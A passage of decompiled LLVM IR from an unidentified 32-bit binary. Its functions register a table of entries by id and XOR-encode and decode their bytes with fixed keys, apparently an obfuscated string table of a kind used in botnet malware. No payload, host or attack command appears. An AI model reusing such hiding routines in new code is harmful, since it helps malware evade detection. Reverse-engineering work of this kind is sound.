  %v3_400d68 = zext i8 %v2_400d68 to i32
  %v2_400d70 = xor i32 %v3_400d68, %v1_400d70
  store i32 %v2_400d70, i32* %v0.global-to-local, align 4
  %v1_400d74 = trunc i32 %v2_400d70 to i8
  store i8 %v1_400d74, i8* %v1_400d68, align 1
  %v0_400d78 = load i32, i32* %a1.global-to-local, align 4
  %v1_400d78 = add i32 %v0_400d78, 4
  %v2_400d78 = inttoptr i32 %v1_400d78 to i32*
  %v3_400d78 = load i32, i32* %v2_400d78, align 4
  %v0_400d80 = load i32, i32* %a0.global-to-local, align 4
  %v2_400d80 = add i32 %v0_400d80, %v3_400d78
  %v1_400d84 = inttoptr i32 %v2_400d80 to i8*
  %v2_400d84 = load i8, i8* %v1_400d84, align 1
  %v3_400d84 = zext i8 %v2_400d84 to i32
  %v1_400d8c = load i32, i32* @a3, align 4
  %v2_400d8c = xor i32 %v1_400d8c, %v3_400d84
  store i32 %v2_400d8c, i32* %v0.global-to-local, align 4
  %v1_400d90 = trunc i32 %v2_400d8c to i8
  store i8 %v1_400d90, i8* %v1_400d84, align 1
  %v0_400d94 = load i32, i32* %a1.global-to-local, align 4
  %v1_400d94 = add i32 %v0_400d94, 4
  %v2_400d94 = inttoptr i32 %v1_400d94 to i32*
  %v3_400d94 = load i32, i32* %v2_400d94, align 4
  %v0_400d9c = load i32, i32* %a0.global-to-local, align 4
  %v2_400d9c = add i32 %v0_400d9c, %v3_400d94
  %v1_400da0 = inttoptr i32 %v2_400d9c to i8*
  %v2_400da0 = load i8, i8* %v1_400da0, align 1
  %v3_400da0 = zext i8 %v2_400da0 to i32
  %v1_400da8 = load i32, i32* %a2.global-to-local, align 4
  %v2_400da8 = xor i32 %v1_400da8, %v3_400da0
  store i32 %v2_400da8, i32* %v0.global-to-local, align 4
  %v1_400dac = trunc i32 %v2_400da8 to i8
  store i8 %v1_400dac, i8* %v1_400da0, align 1
  %v0_400db0 = load i32, i32* %a1.global-to-local, align 4
  %v1_400db0 = add i32 %v0_400db0, 4
  %v2_400db0 = inttoptr i32 %v1_400db0 to i32*
  %v3_400db0 = load i32, i32* %v2_400db0, align 4
  %v0_400db8 = load i32, i32* %a0.global-to-local, align 4
  %v2_400db8 = add i32 %v0_400db8, %v3_400db0
  %v1_400dbc = inttoptr i32 %v2_400db8 to i8*
  %v2_400dbc = load i8, i8* %v1_400dbc, align 1
  %v3_400dbc = zext i8 %v2_400dbc to i32
  %v1_400dc0 = add i32 %v0_400db8, 1
  store i32 %v1_400dc0, i32* %a0.global-to-local, align 4
  %v1_400dc4 = load i32, i32* %a2.global-to-local, align 4
  %v2_400dc4 = xor i32 %v1_400dc4, %v3_400dbc
  store i32 %v2_400dc4, i32* %v0.global-to-local, align 4
  %v1_400dc8 = trunc i32 %v2_400dc4 to i8
  store i8 %v1_400dc8, i8* %v1_400dbc, align 1
  %v0_400dcc = load i32, i32* %a1.global-to-local, align 4
  %v1_400dcc = add i32 %v0_400dcc, 8
  %v2_400dcc = inttoptr i32 %v1_400dcc to i16*
  %v3_400dcc = load i16, i16* %v2_400dcc, align 2
  %v4_400dcc = zext i16 %v3_400dcc to i32
  %v0_400dd4 = load i32, i32* %a0.global-to-local, align 4
  %v2_400dd4 = icmp slt i32 %v0_400dd4, %v4_400dcc
  %v3_400dd4 = zext i1 %v2_400dd4 to i32
  store i32 %v3_400dd4, i32* %v0.global-to-local, align 4
  br i1 %v2_400dd4, label %dec_label_pc_400d5c.dec_label_pc_400d5c_crit_edge, label %dec_label_pc_400ddc

dec_label_pc_400d5c.dec_label_pc_400d5c_crit_edge: ; preds = %dec_label_pc_400d5c
  %v1_400d70.pre = load i32, i32* %t0.global-to-local, align 4
  br label %dec_label_pc_400d5c

dec_label_pc_400ddc:                              ; preds = %dec_label_pc_400d5c
  store i32 0, i32* %a2.global-to-local, align 4
  br label %dec_label_pc_400de8

dec_label_pc_400de8:                              ; preds = %dec_label_pc_400de8, %dec_label_pc_400ddc
  %v0_400df0 = phi i32 [ %v1_400e10, %dec_label_pc_400de8 ], [ 0, %dec_label_pc_400ddc ]
  %v0_400de8 = phi i32 [ %v0_400e14, %dec_label_pc_400de8 ], [ %v0_400dcc, %dec_label_pc_400ddc ]
  %v1_400de8 = add i32 %v0_400de8, 4
  %v2_400de8 = inttoptr i32 %v1_400de8 to i32*
  %v3_400de8 = load i32, i32* %v2_400de8, align 4
  %v2_400df0 = add i32 %v3_400de8, %v0_400df0
  store i32 %v2_400df0, i32* %v0.global-to-local, align 4
  %v1_400df4 = add i32 %v2_400df0, 1
  %v2_400df4 = inttoptr i32 %v1_400df4 to i8*
  %v3_400df4 = load i8, i8* %v2_400df4, align 1
  %v1_400df8 = inttoptr i32 %v2_400df0 to i8*
  %v2_400df8 = load i8, i8* %v1_400df8, align 1
  %v3_400df8 = sext i8 %v2_400df8 to i32
  store i32 %v3_400df8, i32* %a0.global-to-local, align 4
  store i8 %v3_400df4, i8* %v1_400df8, align 1
  %v0_400e00 = load i32, i32* %a1.global-to-local, align 4
  %v1_400e00 = add i32 %v0_400e00, 4
  %v2_400e00 = inttoptr i32 %v1_400e00 to i32*
  %v3_400e00 = load i32, i32* %v2_400e00, align 4
  %v1_400e08 = load i32, i32* %a2.global-to-local, align 4
  %v2_400e08 = add i32 %v1_400e08, %v3_400e00
  store i32 %v2_400e08, i32* %v0.global-to-local, align 4
  %v0_400e0c = load i32, i32* %a0.global-to-local, align 4
  %v1_400e0c = trunc i32 %v0_400e0c to i8
  %v3_400e0c = add i32 %v2_400e08, 1
  %v4_400e0c = inttoptr i32 %v3_400e0c to i8*
  store i8 %v1_400e0c, i8* %v4_400e0c, align 1
  %v0_400e10 = load i32, i32* %a2.global-to-local, align 4
  %v1_400e10 = add i32 %v0_400e10, 2
  store i32 %v1_400e10, i32* %a2.global-to-local, align 4
  %v0_400e14 = load i32, i32* %a1.global-to-local, align 4
  %v1_400e14 = add i32 %v0_400e14, 8
  %v2_400e14 = inttoptr i32 %v1_400e14 to i16*
  %v3_400e14 = load i16, i16* %v2_400e14, align 2
  %v4_400e14 = zext i16 %v3_400e14 to i32
  %v2_400e1c = icmp slt i32 %v1_400e10, %v4_400e14
  %v3_400e1c = zext i1 %v2_400e1c to i32
  store i32 %v3_400e1c, i32* %v0.global-to-local, align 4
  br i1 %v2_400e1c, label %dec_label_pc_400de8, label %dec_label_pc_400e24

dec_label_pc_400e24:                              ; preds = %dec_label_pc_400de8
  %v2_400e28 = add i32 %v0_400e14, 10
  %v3_400e28 = inttoptr i32 %v2_400e28 to i8*
  store i8 0, i8* %v3_400e28, align 1
  ret i32 %v3_400e1c

dec_label_pc_400e30:                              ; preds = %dec_label_pc_400d24
  %v1_400e30 = add i32 %v0_400d3c, 12
  %v2_400e30 = inttoptr i32 %v1_400e30 to i32*
  %v3_400e30 = load i32, i32* %v2_400e30, align 4
  store i32 %v3_400e30, i32* %a1.global-to-local, align 4
  %v1_400e38 = icmp eq i32 %v3_400e30, 0
  br i1 %v1_400e38, label %dec_label_pc_400e3c, label %dec_label_pc_400d24

dec_label_pc_400e3c:                              ; preds = %dec_label_pc_400e30
  store i8 0, i8* inttoptr (i32 10 to i8*), align 2
  %v1_400e44.pre = load i32, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_400e44

dec_label_pc_400e44:                              ; preds = %dec_label_pc_400d38, %dec_label_pc_400e3c
  %v1_400e44 = phi i32 [ %v4_400d3c, %dec_label_pc_400d38 ], [ %v1_400e44.pre, %dec_label_pc_400e3c ]
  ret i32 %v1_400e44

; uselistorder directives
  uselistorder i32 %v3_400e30, { 1, 2, 0 }
  uselistorder i32 %v0_400e14, { 0, 2, 1 }
  uselistorder i32 %v1_400e10, { 0, 2, 1 }
  uselistorder i32 %v0_400dd4, { 1, 0 }
  uselistorder i32 %v0_400dcc, { 0, 2, 1 }
  uselistorder i32 %v0_400db8, { 1, 0 }
  uselistorder i32 %v2_400d24, { 1, 0, 2 }
  uselistorder i32 %v0_400d3c, { 2, 0, 1, 3 }
  uselistorder i32 %v1_400d20, { 1, 0 }
  uselistorder i32* %v0.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder label %dec_label_pc_400e44, { 1, 0 }
}

define i32 @function_400e4c(i32 %arg1) local_unnamed_addr {
dec_label_pc_400e4c:
  %a0.global-to-local = alloca i32, align 4
  %a1.global-to-local = alloca i32, align 4
  %a2.global-to-local = alloca i32, align 4
  %t0.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v3_400e58 = load i32, i32* bitcast (i32** @global_var_4492cc.54 to i32*), align 4
  store i32 %v3_400e58, i32* %v0.global-to-local, align 4
  store i32 %v3_400e58, i32* %a1.global-to-local, align 4
  %v1_400e68 = urem i32 %arg1, 256
  store i32 %v1_400e68, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_400e6c

dec_label_pc_400e6c:                              ; preds = %dec_label_pc_400f7c, %dec_label_pc_400e4c
  %v0_400e84 = phi i32 [ %v3_400f7c, %dec_label_pc_400f7c ], [ %v3_400e58, %dec_label_pc_400e4c ]
  %v1_400e6c = inttoptr i32 %v0_400e84 to i32*
  %v2_400e6c = load i32, i32* %v1_400e6c, align 4
  store i32 %v2_400e6c, i32* %v0.global-to-local, align 4
  %v1_400e74 = icmp sgt i32 %v2_400e6c, 0
  %v2_400e7c = icmp eq i32 %v1_400e68, %v2_400e6c
  %or.cond = and i1 %v1_400e74, %v2_400e7c
  br i1 %or.cond, label %dec_label_pc_400e80, label %dec_label_pc_400f7c

dec_label_pc_400e80:                              ; preds = %dec_label_pc_400e6c
  %v1_400e84 = add i32 %v0_400e84, 10
  %v2_400e84 = inttoptr i32 %v1_400e84 to i8*
  %v3_400e84 = load i8, i8* %v2_400e84, align 1
  %v4_400e84 = sext i8 %v3_400e84 to i32
  store i32 %v4_400e84, i32* %v0.global-to-local, align 4
  %v1_400e8c = icmp eq i8 %v3_400e84, 0
  store i32 0, i32* %a0.global-to-local, align 4
  br i1 %v1_400e8c, label %dec_label_pc_400e90, label %dec_label_pc_400f90

dec_label_pc_400e90:                              ; preds = %dec_label_pc_400e80
  store i32 -19, i32* %t0.global-to-local, align 4
  store i32 -22, i32* @a3, align 4
  store i32 -34, i32* %a2.global-to-local, align 4
  br label %dec_label_pc_400ea4

dec_label_pc_400ea4:                              ; preds = %dec_label_pc_400ea4.dec_label_pc_400ea4_crit_edge, %dec_label_pc_400e90
  %v1_400eb8 = phi i32 [ %v1_400eb8.pre, %dec_label_pc_400ea4.dec_label_pc_400ea4_crit_edge ], [ -19, %dec_label_pc_400e90 ]
  %v0_400eac = phi i32 [ %v0_400f1c, %dec_label_pc_400ea4.dec_label_pc_400ea4_crit_edge ], [ 0, %dec_label_pc_400e90 ]
  %v0_400ea4 = phi i32 [ %v0_400f14, %dec_label_pc_400ea4.dec_label_pc_400ea4_crit_edge ], [ %v0_400e84, %dec_label_pc_400e90 ]
  %v1_400ea4 = add i32 %v0_400ea4, 4
  %v2_400ea4 = inttoptr i32 %v1_400ea4 to i32*
  %v3_400ea4 = load i32, i32* %v2_400ea4, align 4
  %v2_400eac = add i32 %v3_400ea4, %v0_400eac
  %v1_400eb0 = inttoptr i32 %v2_400eac to i8*
  %v2_400eb0 = load i8, i8* %v1_400eb0, align 1
  %v3_400eb0 = zext i8 %v2_400eb0 to i32
  %v2_400eb8 = xor i32 %v3_400eb0, %v1_400eb8
  store i32 %v2_400eb8, i32* %v0.global-to-local, align 4
  %v1_400ebc = trunc i32 %v2_400eb8 to i8
  store i8 %v1_400ebc, i8* %v1_400eb0, align 1
  %v0_400ec0 = load i32, i32* %a1.global-to-local, align 4
  %v1_400ec0 = add i32 %v0_400ec0, 4
  %v2_400ec0 = inttoptr i32 %v1_400ec0 to i32*
  %v3_400ec0 = load i32, i32* %v2_400ec0, align 4
  %v0_400ec8 = load i32, i32* %a0.global-to-local, align 4
  %v2_400ec8 = add i32 %v0_400ec8, %v3_400ec0
  %v1_400ecc = inttoptr i32 %v2_400ec8 to i8*
  %v2_400ecc = load i8, i8* %v1_400ecc, align 1
  %v3_400ecc = zext i8 %v2_400ecc to i32
  %v1_400ed4 = load i32, i32* @a3, align 4
  %v2_400ed4 = xor i32 %v1_400ed4, %v3_400ecc
  store i32 %v2_400ed4, i32* %v0.global-to-local, align 4
  %v1_400ed8 = trunc i32 %v2_400ed4 to i8
  store i8 %v1_400ed8, i8* %v1_400ecc, align 1
  %v0_400edc = load i32, i32* %a1.global-to-local, align 4
  %v1_400edc = add i32 %v0_400edc, 4
  %v2_400edc = inttoptr i32 %v1_400edc to i32*
  %v3_400edc = load i32, i32* %v2_400edc, align 4
  %v0_400ee4 = load i32, i32* %a0.global-to-local, align 4
  %v2_400ee4 = add i32 %v0_400ee4, %v3_400edc
  %v1_400ee8 = inttoptr i32 %v2_400ee4 to i8*
  %v2_400ee8 = load i8, i8* %v1_400ee8, align 1
  %v3_400ee8 = zext i8 %v2_400ee8 to i32
  %v1_400ef0 = load i32, i32* %a2.global-to-local, align 4
  %v2_400ef0 = xor i32 %v1_400ef0, %v3_400ee8
  store i32 %v2_400ef0, i32* %v0.global-to-local, align 4
  %v1_400ef4 = trunc i32 %v2_400ef0 to i8
  store i8 %v1_400ef4, i8* %v1_400ee8, align 1
  %v0_400ef8 = load i32, i32* %a1.global-to-local, align 4
  %v1_400ef8 = add i32 %v0_400ef8, 4
  %v2_400ef8 = inttoptr i32 %v1_400ef8 to i32*
  %v3_400ef8 = load i32, i32* %v2_400ef8, align 4
  %v0_400f00 = load i32, i32* %a0.global-to-local, align 4
  %v2_400f00 = add i32 %v0_400f00, %v3_400ef8
  %v1_400f04 = inttoptr i32 %v2_400f00 to i8*
  %v2_400f04 = load i8, i8* %v1_400f04, align 1
  %v3_400f04 = zext i8 %v2_400f04 to i32
  %v1_400f08 = add i32 %v0_400f00, 1
  store i32 %v1_400f08, i32* %a0.global-to-local, align 4
  %v1_400f0c = load i32, i32* %a2.global-to-local, align 4
  %v2_400f0c = xor i32 %v1_400f0c, %v3_400f04
  store i32 %v2_400f0c, i32* %v0.global-to-local, align 4
  %v1_400f10 = trunc i32 %v2_400f0c to i8
  store i8 %v1_400f10, i8* %v1_400f04, align 1
  %v0_400f14 = load i32, i32* %a1.global-to-local, align 4
  %v1_400f14 = add i32 %v0_400f14, 8
  %v2_400f14 = inttoptr i32 %v1_400f14 to i16*
  %v3_400f14 = load i16, i16* %v2_400f14, align 2
  %v4_400f14 = zext i16 %v3_400f14 to i32
  %v0_400f1c = load i32, i32* %a0.global-to-local, align 4
  %v2_400f1c = icmp slt i32 %v0_400f1c, %v4_400f14
  %v3_400f1c = zext i1 %v2_400f1c to i32
  store i32 %v3_400f1c, i32* %v0.global-to-local, align 4
  br i1 %v2_400f1c, label %dec_label_pc_400ea4.dec_label_pc_400ea4_crit_edge, label %dec_label_pc_400f24

dec_label_pc_400ea4.dec_label_pc_400ea4_crit_edge: ; preds = %dec_label_pc_400ea4
  %v1_400eb8.pre = load i32, i32* %t0.global-to-local, align 4
  br label %dec_label_pc_400ea4

dec_label_pc_400f24:                              ; preds = %dec_label_pc_400ea4
  store i32 0, i32* @a2, align 4
  br label %dec_label_pc_400f30

dec_label_pc_400f30:                              ; preds = %dec_label_pc_400f30, %dec_label_pc_400f24
  %v0_400f38 = phi i32 [ %v1_400f58, %dec_label_pc_400f30 ], [ 0, %dec_label_pc_400f24 ]
  %v0_400f30 = phi i32 [ %v0_400f5c, %dec_label_pc_400f30 ], [ %v0_400f14, %dec_label_pc_400f24 ]
  %v1_400f30 = add i32 %v0_400f30, 4
  %v2_400f30 = inttoptr i32 %v1_400f30 to i32*
  %v3_400f30 = load i32, i32* %v2_400f30, align 4
  %v2_400f38 = add i32 %v3_400f30, %v0_400f38
  store i32 %v2_400f38, i32* %v0.global-to-local, align 4
  %v1_400f3c = add i32 %v2_400f38, 1
  %v2_400f3c = inttoptr i32 %v1_400f3c to i8*
  %v3_400f3c = load i8, i8* %v2_400f3c, align 1
  %v4_400f3c = zext i8 %v3_400f3c to i32
  store i32 %v4_400f3c, i32* @v1, align 4
  %v1_400f40 = inttoptr i32 %v2_400f38 to i8*
  %v2_400f40 = load i8, i8* %v1_400f40, align 1
  %v3_400f40 = sext i8 %v2_400f40 to i32
  store i32 %v3_400f40, i32* %a0.global-to-local, align 4
  store i8 %v3_400f3c, i8* %v1_400f40, align 1
  %v0_400f48 = load i32, i32* %a1.global-to-local, align 4
  %v1_400f48 = add i32 %v0_400f48, 4
  %v2_400f48 = inttoptr i32 %v1_400f48 to i32*
  %v3_400f48 = load i32, i32* %v2_400f48, align 4
  %v1_400f50 = load i32, i32* @a2, align 4
  %v2_400f50 = add i32 %v1_400f50, %v3_400f48
  store i32 %v2_400f50, i32* %v0.global-to-local, align 4
  %v0_400f54 = load i32, i32* %a0.global-to-local, align 4
  %v1_400f54 = trunc i32 %v0_400f54 to i8
  %v3_400f54 = add i32 %v2_400f50, 1
  %v4_400f54 = inttoptr i32 %v3_400f54 to i8*
  store i8 %v1_400f54, i8* %v4_400f54, align 1
  %v0_400f58 = load i32, i32* @a2, align 4
  %v1_400f58 = add i32 %v0_400f58, 2
  store i32 %v1_400f58, i32* @a2, align 4
  %v0_400f5c = load i32, i32* %a1.global-to-local, align 4
  %v1_400f5c = add i32 %v0_400f5c, 8
  %v2_400f5c = inttoptr i32 %v1_400f5c to i16*
  %v3_400f5c = load i16, i16* %v2_400f5c, align 2
  %v4_400f5c = zext i16 %v3_400f5c to i32
  %v1_400f64 = add nsw i32 %v4_400f5c, -1
  %v2_400f68 = icmp slt i32 %v1_400f58, %v1_400f64
  store i32 1, i32* %v0.global-to-local, align 4
  br i1 %v2_400f68, label %dec_label_pc_400f30, label %dec_label_pc_400f70

dec_label_pc_400f70:                              ; preds = %dec_label_pc_400f30
  %v5_400f74 = add i32 %v0_400f5c, 10
  %v6_400f74 = inttoptr i32 %v5_400f74 to i8*
  store i8 1, i8* %v6_400f74, align 1
  ret i32 1

dec_label_pc_400f7c:                              ; preds = %dec_label_pc_400e6c
  %v1_400f7c = add i32 %v0_400e84, 12
  %v2_400f7c = inttoptr i32 %v1_400f7c to i32*
  %v3_400f7c = load i32, i32* %v2_400f7c, align 4
  store i32 %v3_400f7c, i32* %a1.global-to-local, align 4
  %v1_400f84 = icmp eq i32 %v3_400f7c, 0
  store i32 1, i32* %v0.global-to-local, align 4
  br i1 %v1_400f84, label %dec_label_pc_400f88, label %dec_label_pc_400e6c

dec_label_pc_400f88:                              ; preds = %dec_label_pc_400f7c
  store i8 1, i8* inttoptr (i32 10 to i8*), align 2
  %v1_400f90.pre = load i32, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_400f90

dec_label_pc_400f90:                              ; preds = %dec_label_pc_400e80, %dec_label_pc_400f88
  %v1_400f90 = phi i32 [ %v4_400e84, %dec_label_pc_400e80 ], [ %v1_400f90.pre, %dec_label_pc_400f88 ]
  ret i32 %v1_400f90

; uselistorder directives
  uselistorder i32 %v3_400f7c, { 1, 2, 0 }
  uselistorder i32 %v0_400f5c, { 0, 2, 1 }
  uselistorder i32 %v1_400f58, { 0, 2, 1 }
  uselistorder i32 %v0_400f1c, { 1, 0 }
  uselistorder i32 %v0_400f14, { 0, 2, 1 }
  uselistorder i32 %v0_400f00, { 1, 0 }
  uselistorder i32 %v2_400e6c, { 1, 0, 2 }
  uselistorder i32 %v0_400e84, { 2, 0, 1, 3 }
  uselistorder i32 %v1_400e68, { 1, 0 }
  uselistorder i32* %v0.global-to-local, { 0, 1, 4, 2, 3, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder label %dec_label_pc_400f90, { 1, 0 }
}

define i32 @function_400f98(i32 %arg1) local_unnamed_addr {
dec_label_pc_400f98:
  %v3_400fa4 = load i32, i32* bitcast (i32** @global_var_4492cc.54 to i32*), align 4
  %v1_400fb4 = urem i32 %arg1, 256
  br label %dec_label_pc_400fb8

dec_label_pc_400fb8:                              ; preds = %dec_label_pc_400fdc, %dec_label_pc_400f98
  %v0_400fd0 = phi i32 [ %v3_400fdc, %dec_label_pc_400fdc ], [ %v3_400fa4, %dec_label_pc_400f98 ]
  %v1_400fb8 = inttoptr i32 %v0_400fd0 to i32*
  %v2_400fb8 = load i32, i32* %v1_400fb8, align 4
  %v1_400fc0 = icmp sgt i32 %v2_400fb8, 0
  %v2_400fc8 = icmp eq i32 %v1_400fb4, %v2_400fb8
  %or.cond = and i1 %v1_400fc0, %v2_400fc8
  br i1 %or.cond, label %dec_label_pc_400fcc, label %dec_label_pc_400fdc

dec_label_pc_400fcc:                              ; preds = %dec_label_pc_400fb8
  %v1_400fd0 = add i32 %v0_400fd0, 4
  %v2_400fd0 = inttoptr i32 %v1_400fd0 to i32*
  %v3_400fd0 = load i32, i32* %v2_400fd0, align 4
  ret i32 %v3_400fd0

dec_label_pc_400fdc:                              ; preds = %dec_label_pc_400fb8
  %v1_400fdc = add i32 %v0_400fd0, 12
  %v2_400fdc = inttoptr i32 %v1_400fdc to i32*
  %v3_400fdc = load i32, i32* %v2_400fdc, align 4
  %v1_400fe4 = icmp eq i32 %v3_400fdc, 0
  br i1 %v1_400fe4, label %dec_label_pc_400fe8, label %dec_label_pc_400fb8

dec_label_pc_400fe8:                              ; preds = %dec_label_pc_400fdc
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_400fdc, { 1, 0 }
  uselistorder i32 %v2_400fb8, { 1, 0 }
  uselistorder i32 %v0_400fd0, { 1, 0, 2 }
}

define i32 @function_400ff4() local_unnamed_addr {
dec_label_pc_400ff4:
  %v3_40100c = load i32, i32* @global_var_449458.24, align 4
  store i32 %v3_40100c, i32* @t9, align 4
  %v2_401014 = call i32 @function_405dd0(i32 16)
  %v1_401020 = inttoptr i32 %v2_401014 to i32*
  store i32 0, i32* %v1_401020, align 4
  %v3_401024 = load i32, i32* bitcast (i32** @global_var_449394.56 to i32*), align 4
  %v2_40102c = inttoptr i32 %v3_401024 to i32*
  store i32 %v2_401014, i32* %v2_40102c, align 4
  %v3_401030 = load i32, i32* bitcast (i32** @global_var_4492cc.54 to i32*), align 4
  %v2_401038 = inttoptr i32 %v3_401030 to i32*
  store i32 %v2_401014, i32* %v2_401038, align 4
  %v1_40103c = add i32 %v2_401014, 12
  %v2_40103c = inttoptr i32 %v1_40103c to i32*
  store i32 0, i32* %v2_40103c, align 4
  ret i32 %v2_401014

; uselistorder directives
  uselistorder i32 %v2_401014, { 0, 2, 1, 3, 4 }
}

define i32 @function_401050(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_401050:
  %v1.global-to-local = alloca i32, align 4
  %v0_401068 = load i32, i32* @s2, align 4
  %v0_40106c = load i32, i32* @s1, align 4
  %v0_401070 = load i32, i32* @s0, align 4
  %v3_401078 = load i32, i32* @global_var_449458.24, align 4
  store i32 %v3_401078, i32* @t9, align 4
  store i32 %arg1, i32* @s2, align 4
  %v1_401084 = urem i32 %arg2, 65536
  store i32 %v1_401084, i32* @s1, align 4
  %v3_401088 = call i32 @function_405dd0(i32 16)
  %v0_401094 = load i32, i32* @s1, align 4
  %v3_401098 = load i32, i32* @global_var_449458.24, align 4
  store i32 %v3_401098, i32* @t9, align 4
  %v0_40109c = load i32, i32* @s2, align 4
  %v2_40109c = inttoptr i32 %v3_401088 to i32*
  store i32 %v0_40109c, i32* %v2_40109c, align 4
  store i32 %v3_401088, i32* @s0, align 4
  %v3_4010a0 = call i32 @function_405dd0(i32 %v0_401094)
  store i32 %v3_4010a0, i32* @v0, align 4
  %v1_4010ac = load i32, i32* @s0, align 4
  %v2_4010ac = add i32 %v1_4010ac, 4
  %v3_4010ac = inttoptr i32 %v2_4010ac to i32*
  store i32 %v3_4010a0, i32* %v3_4010ac, align 4
  %v3_4010b0 = load i32, i32* @global_var_44936c.20, align 4
  store i32 %v3_4010b0, i32* @t9, align 4
  %v2_4010bc = call i32 @function_4043a4()
  %v3_4010cc = load i32, i32* bitcast (i32** @global_var_449394.56 to i32*), align 4
  store i32 %v3_4010cc, i32* %v1.global-to-local, align 4
  %v0_4010d0 = load i32, i32* @s1, align 4
  %v1_4010d0 = trunc i32 %v0_4010d0 to i16
  %v2_4010d0 = load i32, i32* @s0, align 4
  %v3_4010d0 = add i32 %v2_4010d0, 8
  %v4_4010d0 = inttoptr i32 %v3_4010d0 to i16*
  store i16 %v1_4010d0, i16* %v4_4010d0, align 2
  %v3_4010d8 = load i32, i32* @s0, align 4
  %v4_4010d8 = add i32 %v3_4010d8, 10
  %v5_4010d8 = inttoptr i32 %v4_4010d8 to i8*
  store i8 -1, i8* %v5_4010d8, align 1
  %v0_4010dc = load i32, i32* @s0, align 4
  %v1_4010dc = add i32 %v0_4010dc, 12
  %v2_4010dc = inttoptr i32 %v1_4010dc to i32*
  store i32 0, i32* %v2_4010dc, align 4
  %v0_4010e0 = load i32, i32* @s0, align 4
  store i32 %v0_4010e0, i32* @global_var_4493a0.57, align 4
  %v1_4010e4 = load i32, i32* %v1.global-to-local, align 4
  %v2_4010e4 = inttoptr i32 %v1_4010e4 to i32*
  store i32 %v0_4010e0, i32* %v2_4010e4, align 4
  store i32 %v0_401068, i32* @s2, align 4
  store i32 %v0_40106c, i32* @s1, align 4
  store i32 %v0_401070, i32* @s0, align 4
  ret i32 -1
}

define i32 @function_401104() local_unnamed_addr {
dec_label_pc_401104:
  %a0.global-to-local = alloca i32, align 4
  %a1.global-to-local = alloca i32, align 4
  %a2.global-to-local = alloca i32, align 4
  %fp.global-to-local = alloca i32, align 4
  %s0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %s4.global-to-local = alloca i32, align 4
  %s6.global-to-local = alloca i32, align 4
  %t9.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  %tmp39 = call i8 @__decompiler_undefined_function_1()
  %stack_var_-8768 = alloca i8, align 1
  %stack_var_-8784 = alloca i32, align 4
  %stack_var_-8752 = alloca i32, align 4
  %stack_var_-4143 = alloca i32, align 4
  %stack_var_-8239 = alloca i32, align 4
  %v0_401114 = load i32, i32* @ra, align 4
  %v3_40111c = load i32, i32* @global_var_4493a4.58, align 4
  store i32 %v3_40111c, i32* @t9, align 4
  %v1_401124 = call i32 @function_400ff4()
  store i32 %v1_401124, i32* %v0.global-to-local, align 4
  store i32 1, i32* %a0.global-to-local, align 4
  %v3_401138 = load i32, i32* @global_var_449388.60, align 4
  store i32 %v3_401138, i32* @t9, align 4
  store i32 ptrtoint (i32* @global_var_408130.61 to i32), i32* %a2.global-to-local, align 4
  store i32 7, i32* %a1.global-to-local, align 4
  %v4_401140 = call i32 @function_401050(i32 1, i32 7, i32 ptrtoint (i32* @global_var_408130.61 to i32))
  store i32 %v4_401140, i32* %v0.global-to-local, align 4
  store i32 2, i32* %a0.global-to-local, align 4
  %v3_401154 = load i32, i32* @global_var_449388.60, align 4
  store i32 %v3_401154, i32* @t9, align 4
  store i32 ptrtoint (i32* @global_var_408138.62 to i32), i32* %a2.global-to-local, align 4
  store i32 6, i32* %a1.global-to-local, align 4
  %v4_40115c = call i32 @function_401050(i32 2, i32 6, i32 ptrtoint (i32* @global_var_408138.62 to i32))
  store i32 %v4_40115c, i32* %v0.global-to-local, align 4
  store i32 3, i32* %a0.global-to-local, align 4
  %v3_401170 = load i32, i32* @global_var_449388.60, align 4
  store i32 %v3_401170, i32* @t9, align 4
  store i32 ptrtoint (i32* @global_var_408140.63 to i32), i32* %a2.global-to-local, align 4
  store i32 5, i32* %a1.global-to-local, align 4
  %v4_401178 = call i32 @function_401050(i32 3, i32 5, i32 ptrtoint (i32* @global_var_408140.63 to i32))
  store i32 %v4_401178, i32* %v0.global-to-local, align 4
  store i32 4, i32* %a0.global-to-local, align 4
  %v3_40118c = load i32, i32* @global_var_449388.60, align 4
  store i32 %v3_40118c, i32* @t9, align 4
  store i32 ptrtoint (i32* @global_var_408148.64 to i32), i32* %a2.global-to-local, align 4
  store i32 14, i32* %a1.global-to-local, align 4
  %v4_401194 = call i32 @function_401050(i32 4, i32 14, i32 ptrtoint (i32* @global_var_408148.64 to i32))
  store i32 %v4_401194, i32* %v0.global-to-local, align 4
  store i32 5, i32* %a0.global-to-local, align 4
  %v3_4011a8 = load i32, i32* @global_var_449388.60, align 4
  store i32 %v3_4011a8, i32* @t9, align 4
  store i32 ptrtoint (i32* @global_var_408158.65 to i32), i32* %a2.global-to-local, align 4
  store i32 4, i32* %a1.global-to-local, align 4
  %v4_4011b0 = call i32 @function_401050(i32 5, i32 4, i32 ptrtoint (i32* @global_var_408158.65 to i32))
  store i32 %v4_4011b0, i32* %v0.global-to-local, align 4
  store i32 6, i32* %a0.global-to-local, align 4
  %v3_4011c4 = load i32, i32* @global_var_449388.60, align 4
  store i32 %v3_4011c4, i32* @t9, align 4
  store i32 ptrtoint (i32* @global_var_408160.66 to i32), i32* %a2.global-to-local, align 4
  store i32 17, i32* %a1.global-to-local, align 4
  %v4_4011cc = call i32 @function_401050(i32 6, i32 17, i32 ptrtoint (i32* @global_var_408160.66 to i32))
  store i32 %v4_4011cc, i32* %v0.global-to-local, align 4
  store i32 7, i32* %a0.global-to-local, align 4
  %v3_4011e0 = load i32, i32* @global_var_449388.60, align 4
  store i32 %v3_4011e0, i32* @t9, align 4
  store i32 ptrtoint (i32* @global_var_408174.67 to i32), i32* %a2.global-to-local, align 4
  store i32 10, i32* %a1.global-to-local, align 4
  %v4_4011e8 = call i32 @function_401050(i32 7, i32 10, i32 ptrtoint (i32* @global_var_408174.67 to i32))
